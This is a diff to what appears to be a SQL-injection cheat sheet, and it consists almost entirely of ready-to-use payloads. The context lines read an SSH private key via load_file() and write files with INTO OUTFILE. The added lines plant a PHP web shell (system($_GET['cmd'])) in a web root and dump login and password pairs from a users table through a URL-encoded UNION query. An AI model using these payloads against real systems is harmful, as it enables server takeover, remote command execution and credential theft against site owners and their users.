@@ -66,3 +66,12 @@ into outfile 'C:\\xampp\\htdocs\\filename.ext'
 load_file('C:\\Users\\username\\.ssh\\id_rsa')
 ```
 
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE
+"/var/www/html/tmp/webshell.php" -- //
+```
+
+```
+https://vulnerable.site/vulnerable.php?id=-1%20union%20select%201,group_concat(login,%27:%27,password),3,4%20from%20users
+```
+
